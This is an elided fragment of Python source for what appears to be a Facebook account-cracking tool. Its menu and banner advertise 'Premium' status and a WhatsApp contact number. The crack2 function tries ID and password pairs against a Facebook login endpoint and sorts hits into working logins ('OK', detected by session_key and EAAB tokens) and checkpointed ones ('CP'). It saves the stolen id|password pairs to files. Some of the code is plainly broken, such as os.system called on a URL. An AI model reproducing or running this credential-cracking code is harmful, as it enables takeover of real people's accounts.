...
def menu(): #Chang
	...
	if farhan in ['1','01']:
		...
		os.system("https://www.facebook.com/profile.php?id=100078655686966")
		exit()
...
def File2():
			...
			banner()
			try:
				fileX = input ('\x1b[1;90m───────────────────────────────────────────────────\n\x1b[1;93m─━㋱\x1b[1;97mSTATUS\x1b[1;90m : \x1b[1;92mPremium\x1b[1;97m WHATSAPP\x1b[1;90m : \x1b[1;97m03482593139\x1b[1;93m㋱━─\n\x1b[1;90m───────────────────────────────────────────────────\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Masukan File Cil\x1b[1;90m :\x1b[1;92m ') 
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s   [HANDSOME] %s/%s  OK/%s | CP/%s : %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s   [HANDSOME-CP] %s|%s        '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAB" in resp.text:
				print('\r%s   [HANDSOME-OK] %s|%s        '%(h,idf,pw))
